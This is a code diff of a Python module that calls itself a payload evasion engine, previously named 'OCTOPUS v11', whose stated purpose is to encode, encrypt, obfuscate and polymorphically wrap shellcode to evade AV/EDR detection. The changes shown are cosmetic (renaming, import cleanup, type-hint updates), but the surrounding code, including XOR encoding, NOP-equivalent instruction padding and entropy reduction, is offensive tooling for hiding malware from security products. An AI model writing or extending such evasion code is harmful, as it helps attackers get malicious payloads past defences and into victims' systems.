@@ -1,5 +1,5 @@
 """
-OCTOPUS v11 — Payload Evasion Engine.
+Payload evasion engine.
 
 Provides payload encoding, encryption, obfuscation, and stager generation
 to evade AV/EDR detection. All techniques are designed to be composable —
@@ -17,11 +17,8 @@ Techniques:
 
 import base64
 import logging
-import os
 import random
 import secrets
-import string
-from typing import List, Tuple
 
 from cryptography.hazmat.primitives.ciphers.aead import AESGCM
 
@@ -59,7 +56,7 @@ def xor_encode(payload: bytes, key: bytes) -> bytes:
     return bytes(payload[i] ^ key[i % key_len] for i in range(len(payload)))
 
 
-def aes_encrypt_payload(payload: bytes) -> Tuple[bytes, bytes]:
+def aes_encrypt_payload(payload: bytes) -> tuple[bytes, bytes]:
     """Encrypt a payload using AES-256-GCM.
 
     Generates a random 256-bit key and 96-bit nonce, encrypts the payload
@@ -200,7 +197,7 @@ def string_obfuscate(s: str) -> str:
     if not s:
         return '""'
 
-    parts: List[str] = []
+    parts: list[str] = []
     # Randomly group characters (1-3 at a time) for less uniform output
     i = 0
     while i < len(s):
@@ -294,7 +291,7 @@ def polymorphic_wrapper(shellcode: bytes) -> bytes:
         and appended.
     """
     # NOP-equivalent instruction pairs (push/pop register)
-    nop_equivalents: List[bytes] = [
+    nop_equivalents: list[bytes] = [
         b"\x90",           # NOP
         b"\x50\x58",       # PUSH EAX; POP EAX
         b"\x51\x59",       # PUSH ECX; POP ECX
@@ -348,7 +345,7 @@ def entropy_reduce(data: bytes) -> bytes:
         True
     """
     # Low-entropy padding patterns (ASCII text-like)
-    padding_patterns: List[bytes] = [
+    padding_patterns: list[bytes] = [
         b"AAAA",
         b"This",
         b"data",
